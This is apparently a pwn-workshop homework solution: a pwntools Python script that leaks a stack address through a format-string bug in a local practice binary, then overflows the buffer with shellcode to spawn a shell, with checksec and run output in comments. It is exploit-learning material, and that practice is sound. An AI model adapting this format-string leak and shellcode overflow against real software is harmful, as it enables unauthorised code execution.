#!/usr/bin/env python3 
from pwn import *

context.update(arch='amd64', os='linux')
# context.log_level = "debug"

chall = "./chal"
p = process(chall)

emoji1 = b"\xf0\x9f\xa7\x91"  # 🧑
emoji2 = b"\xf0\x9f\x90\xa6"  # 🐦


# buf address leak
p.sendlineafter(emoji1 + b" > ", b"%p")
p.recvuntil(emoji2 + b" > ")
leak = int(p.recvuntil(emoji1, drop=True).strip(), 16)
log.info("leak: " + hex(leak))


# exec shellcode
offset = 72
shellcode = asm(shellcraft.sh())
payload = shellcode + b"B" * (offset - len(shellcode)) + p64(leak)
p.sendlineafter(b"> ", payload)

p.interactive()

# $ checksec --file=chal
# [*] '/home/sny430/workspace/pwn_workshop_hw/exploit1/chal'
#     Arch:       amd64-64-little
#     RELRO:      No RELRO
#     Stack:      No canary found
#     NX:         NX unknown - GNU_STACK missing
#     PIE:        No PIE (0x400000)
#     Stack:      Executable
#     RWX:        Has RWX segments
#     SHSTK:      Enabled
#     IBT:        Enabled
#     Stripped:   No
#     Debuginfo:  Yes

# $ poetry run python3 exploit.py
# [+] Starting local process './chal': pid 130191
# [*] leak: 0x7ffd5ec2eb20
# [*] Switching to interactive mode
# 🐦 > jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05BBBBBBBBBBBBBBBBBBBBBBBB \xeb\xc2^\xfd\x7f
# $ whoami
# sny430
